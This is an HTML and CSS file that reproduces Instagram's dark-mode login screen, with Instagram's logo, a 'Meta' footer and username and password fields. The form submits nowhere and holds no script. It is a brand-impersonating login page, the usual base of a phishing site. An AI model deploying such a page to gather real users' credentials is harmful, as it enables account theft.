<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #121212;
      font-family: Arial, sans-serif;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .container {
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    .language {
      margin-bottom: 30px;
      font-size: 14px;
      color: #bbb;
    }
    .logo {
      width: 80px;
      margin: 20px auto;
    }
    input {
      width: 100%;
      padding: 14px;
      margin: 8px 0;
      border: 1px solid #333;
      border-radius: 8px;
      background-color: #222;
      color: #fff;
      font-size: 16px;
      box-sizing: border-box;
    }
    button.login {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      background-color: #0095f6;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-size: 16px;
      cursor: pointer;
    }
    button.login:hover {
      background-color: #007dc1;
    }
    .forgot {
      margin-top: 15px;
      font-size: 14px;
      color: #bbb;
      cursor: pointer;
    }
    .create {
      margin-top: 25px;
      padding: 12px;
      width: 100%;
      border: 1px solid #333;
      border-radius: 8px;
      background-color: transparent;
      color: #0095f6;
      font-size: 16px;
      cursor: pointer;
    }
    .meta {
      margin-top: 20px;
      font-size: 12px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="language">English (India)</div>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/120px-Instagram_icon.png" alt="Instagram Logo" class="logo"/>
    <form>
      <input type="text" placeholder="Username, email address or mobile number"/>
      <input type="password" placeholder="Password"/>
      <button type="submit" class="login">Log in</button>
    </form>
    <div class="forgot">Forgotten password?</div>
    <button class="create">Create new account</button>
    <div class="meta">Meta</div>
  </div>
</body>
</html>
